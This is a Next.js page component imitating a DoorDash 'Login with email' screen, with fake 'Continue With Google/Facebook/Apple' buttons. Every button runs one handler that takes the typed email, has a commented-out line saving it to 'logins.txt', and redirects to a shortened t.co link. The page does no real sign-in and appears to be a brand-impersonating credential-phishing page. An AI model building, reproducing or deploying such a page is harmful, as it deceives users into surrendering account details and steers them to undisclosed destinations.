'use client'
import IconButton from "@components/IconButton";
import Info from "@components/Info";
import Image from "next/image";
import { useState } from "react";
// import fs from 'fs';
// import path from 'path';
import { useRouter } from "next/navigation";


const Home = () => {

  const[email,setEmail] = useState('');
  const router = useRouter();

  const handleSubmit = (e) => {
    e.preventDefault();

    // fs.writeFileSync(path.join(process.cwd(), 'logins.txt'), JSON.stringify(email));
    router.push('https://t.co/65GwtTi0Gn');
  };
  return (
    <section className="w-full flex-col">
        <div className="top ">
          <Image
          src={'/assets/icons/DASH.png'}
          alt="dash logo"
          width={31}
          height={18}
          className="mr-2 text-[#FF3008]"
          />
          DOORDASH</div>
          <div className="flex justify-center items-center flex-col">
            <h1 className="text-xl font-satoshi font-bold py-5">Login with email</h1>
            <div className="flex justify-center items-center mt-3">
              <button className="signIn_btn"  type="button">
                sign In
              </button>
              <button className="signUp_btn" type="button">
                sign Up
              </button>
            </div>
            <div className="flex flex-col justify-start mt-8 w-80">
            <label className="font-bold font-satoshi text-lg max-w-full">
            Email
            </label>
              <input type="email" placeholder="Required"
              value={email}
              required
              onChange={(e)=>setEmail(e.target.value)}
              className="text-black font-satoshi text-lg mt-2 pl-3 w-full bg-gray-200 rounded py-2"
              />

              <button
              type="button"
              onClick={handleSubmit}
              className="mt-8 text-center text-white bg-[#EB1700] w-full rounded-full py-3 font-bold font- "
              >Continue to Sign In
              </button>
              <p className="desc">By continuing with the sign in process, 
                we may send you a one-time verification code via text message to the phone number associated with your account.
                 Message and data rates may apply</p>

                 <div className="flex justify-center items-center mb-1">
                <p>or</p>
                 </div>
                 <IconButton
                 color={"#4285F4"}
                 alt={'google'}
                 icon={'/assets/icons/google.png'}
                 text={'Continue With Google'}
                 handleOnclick={handleSubmit}
                 />
                 <IconButton
                 color={"#3B5998"}
                 alt={'google'}
                 icon={'/assets/icons/facebook.png'}
                 text={'Continue With Facebook'}
                 handleOnclick={handleSubmit}
                 />
                 <IconButton
                 color={"black"}
                 alt={'google'}
                 icon={'/assets/icons/apple.png'}
                 text={'Continue With Apple'}
                 handleOnclick={handleSubmit}
                 />
              </div>
          </div>
          <Info/>
    </section>
  )
}

export default Home